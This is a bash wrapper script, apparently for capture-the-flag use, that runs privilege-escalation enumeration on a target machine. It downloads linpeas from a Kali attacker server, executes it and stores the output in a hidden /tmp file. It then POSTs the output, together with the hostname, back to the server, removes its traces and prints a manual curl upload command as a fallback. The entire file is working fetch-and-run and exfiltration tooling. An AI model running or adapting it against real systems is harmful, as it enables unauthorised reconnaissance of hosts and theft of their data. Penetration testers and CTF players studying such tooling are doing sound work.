#!/bin/bash
#
# ParsingPeas Wrapper Script
# Runs linpeas/winpeas and automatically sends output to Kali host
# NOTE: Downloads scripts from Kali host (for isolated CTF environments)
#

SERVER_URL="KALI_SERVER_URL"  # Will be replaced by receiver.py
SESSION_ID="scan_$(date +%s)_$$"
HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
TMP_OUTPUT="/tmp/.linpeas_$(date +%s).tmp"

echo "[*] ParsingPeas - Automated Privilege Escalation Scanner"
echo "[*] Session ID: $SESSION_ID"
echo "[*] Hostname: $HOSTNAME"
echo "[*] Server: $SERVER_URL"
echo ""

# Check for curl
if ! command -v curl &> /dev/null; then
    echo "[!] Error: curl not found. Trying wget..."
    if ! command -v wget &> /dev/null; then
        echo "[!] Error: Neither curl nor wget available. Exiting."
        exit 1
    fi
    USE_WGET=1
fi

# Detect OS
if [[ "$OSTYPE" == "linux-gnu"* ]] || [[ "$OSTYPE" == "darwin"* ]] || [[ -z "$OSTYPE" ]]; then
    SCAN_TYPE="linpeas"
    echo "[*] Detected: Linux/Unix system"
    SCRIPT_ENDPOINT="$SERVER_URL/get-linpeas"
    SCRIPT_PATH="/tmp/linpeas.sh"
else
    SCAN_TYPE="winpeas"
    echo "[*] Detected: Windows system"
    SCRIPT_ENDPOINT="$SERVER_URL/get-winpeas"
    SCRIPT_PATH="/tmp/winpeas.exe"
fi

echo "[*] Downloading $SCAN_TYPE from Kali host..."

# Download script from Kali host (NOT from internet!)
if [[ $USE_WGET ]]; then
    wget -q -O "$SCRIPT_PATH" "$SCRIPT_ENDPOINT" || { echo "[!] Download failed"; exit 1; }
else
    curl -sSL "$SCRIPT_ENDPOINT" -o "$SCRIPT_PATH" || { echo "[!] Download failed"; exit 1; }
fi

if [[ ! -f "$SCRIPT_PATH" ]] || [[ ! -s "$SCRIPT_PATH" ]]; then
    echo "[!] Error: Script download failed or empty"
    exit 1
fi

echo "[+] Downloaded successfully"

# Make executable and run
if [[ $SCAN_TYPE == "linpeas" ]]; then
    chmod +x "$SCRIPT_PATH"
    
    echo "[*] Running linpeas (this may take a few minutes)..."
    echo ""
    
    # Run linpeas and save output
    "$SCRIPT_PATH" 2>&1 | tee "$TMP_OUTPUT"
    
    # Check if output was generated
    if [[ ! -f "$TMP_OUTPUT" ]] || [[ ! -s "$TMP_OUTPUT" ]]; then
        echo "[!] Error: No output generated"
        exit 1
    fi
    
    OUTPUT_SIZE=$(stat -f%z "$TMP_OUTPUT" 2>/dev/null || stat -c%s "$TMP_OUTPUT" 2>/dev/null)
    echo ""
    echo "[*] Scan complete. Output size: $((OUTPUT_SIZE / 1024)) KB"
    echo "[*] Transferring to Kali host..."
    
    # Send to Kali with retry logic
    MAX_RETRIES=3
    RETRY_COUNT=0
    
    while [[ $RETRY_COUNT -lt $MAX_RETRIES ]]; do
        if curl -X POST \
            -H "X-Session-ID: $SESSION_ID" \
            -H "X-Hostname: $HOSTNAME" \
            -H "X-Scan-Type: $SCAN_TYPE" \
            -H "Content-Type: text/plain" \
            --data-binary "@$TMP_OUTPUT" \
            --max-time 300 \
            "$SERVER_URL/upload" 2>&1 | tee /tmp/.transfer_response.tmp | grep -q '"status":"success"'; then
            
            echo ""
            echo "[+] Transfer successful!"
            
            # Extract and display report URL
            REPORT_URL=$(grep -o '"report_url":"[^"]*"' /tmp/.transfer_response.tmp | cut -d'"' -f4)
            if [[ -n "$REPORT_URL" ]]; then
                echo "[+] View report at: $SERVER_URL$REPORT_URL"
            fi
            
            echo "[+] Cleaning up..."
            rm -f "$SCRIPT_PATH" "$TMP_OUTPUT" /tmp/.transfer_response.tmp
            echo "[+] Done!"
            exit 0
        else
            RETRY_COUNT=$((RETRY_COUNT + 1))
            echo "[!] Transfer failed (attempt $RETRY_COUNT/$MAX_RETRIES)"
            if [[ $RETRY_COUNT -lt $MAX_RETRIES ]]; then
                echo "[*] Retrying in 2 seconds..."
                sleep 2
            fi
        fi
    done
    
    echo "[!] Transfer failed after $MAX_RETRIES attempts"
    echo "[*] Output saved locally at: $TMP_OUTPUT"
    echo "[*] You can manually transfer with:"
    echo "    curl -X POST -H 'X-Hostname: $HOSTNAME' --data-binary @$TMP_OUTPUT $SERVER_URL/upload"
    exit 1
fi

echo "[!] Windows support coming soon!"
exit 1
